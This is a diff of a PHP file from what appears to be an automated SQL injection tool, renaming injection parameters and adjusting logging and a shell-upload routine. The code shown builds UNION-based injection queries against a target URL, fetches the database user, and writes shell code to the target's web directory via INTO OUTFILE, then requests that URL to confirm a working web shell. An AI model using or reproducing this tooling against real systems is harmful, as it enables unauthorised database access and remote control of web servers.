@@ -275,16 +275,18 @@
 										if($result){ //Found SQL UNION Injection
 
 											foreach($requestVariables as $key=>$rV){
+
 												if($key == $requestVariable){
 													unset($requestVariables[$key]);
 												}
+
 											}
 
 											$injectionParameters	=	array(
-																				"index"						=>	$maxFields,	
+																				"queryNumFields"			=>	$maxFields,	
 																				"fieldValues"				=>	$iterationContainer,
-																				"requestVariable"			=>	$requestVariable,
-																				"requestValue"				=>	$madeUpValue,
+																				"affectedUrlVar"			=>	$requestVariable,
+																				"affectedUrlVal"			=>	$madeUpValue,
 																				"requestVariables"		=> $requestVariables,
 																				"wrapping"					=>	$wrapping,
 																				"payload"					=>	$payLoad,		//constant
@@ -295,6 +297,7 @@
 																				"affectedQueryField"		=> $result[0],
 																				"mod_rewrite"				=>	$mod_rewrite
 											);
+
 
 											$this->setInjectionParameters($injectionParameters);
 
@@ -376,9 +379,9 @@
 
 				$params	=	$this->_injection;
 				$sql		=	$this->_queryBuilder->getSQL();
-				$sql		=	$params["requestValue"].$params["payload"].$this->_queryBuilder->getSpaceCharacter().$sql.$params["comment"];
+				$sql		=	$params["affectedUrlVal"].$params["payload"].$this->_queryBuilder->getSpaceCharacter().$sql.$params["comment"];
 				$this->_queryBuilder->setSQL($sql);
-				return parent::query($params["requestVariable"],__FUNCTION__,$this->_injection["mod_rewrite"]);
+				return parent::query($params["affectedUrlVar"],__FUNCTION__,$this->_injection["mod_rewrite"]);
 
 			}
 
@@ -544,8 +547,11 @@
 
 				$version					=	$this->getVersion();
 				$version					=	$version[0];
+				$this->log("Fetching database user ...",0,"light_green");
 				$user						=	$this->getUser();
 				$user						=	$user[0];
+				$this->log("Found user $user",0,"yellow");
+				
 
 				if(isset($this->_config["all"]["ommit-schemas"]) && !empty($this->_config["all"]["ommit-schemas"])){
 
@@ -765,7 +771,6 @@
 				}
 
 				$callback	=	$this->_injection["callback"];
-				$this->log("Fetching database user ...",0,"light_green");
 				$user			=	$this->$callback("USER()");
 				return $user;
 
@@ -915,26 +920,28 @@
 							$this->buildUnionInjection($shellCode);
 							$this->_queryBuilder->toOutFile($shellDirLocation);
 
-							$sql	=	$this->_injection["requestValue"]			.
+							$sql	=	$this->_injection["affectedUrlVal"]			.
 										$this->_injection["payload"]					.
 										$this->_queryBuilder->getSpaceCharacter()	.
 										$this->_queryBuilder->getSQL()				.
 										$this->_injection["comment"];
 
 							$this->_queryBuilder->setSQL($sql);
-							parent::query($this->_injection["affectedQueryField"],__FUNCTION__,$this->_injection["mod_rewrite"]);	
+							parent::query($this->_injection["affectedUrlVar"],__FUNCTION__,$this->_injection["mod_rewrite"]);	
 
 							$shellUrl	=	new \aidSQL\parser\Url($shellWebLocation);
 							$this->_httpAdapter->setUrl($shellUrl);
 							$parser		=	parent::getParser();
 							$content		=	$this->_httpAdapter->fetch();
+
 							echo $shellUrl."\n";
 							echo $content."\n";
-							die();
+
 							$gotShell	=	$parser->analyze($content);
 							
+							$this->_httpAdapter->setUrl($restoreUrl);
+
 							if($gotShell){
-								$this->_httpAdapter->setUrl($restoreUrl);
 								return $shellUrl;
 							}
 
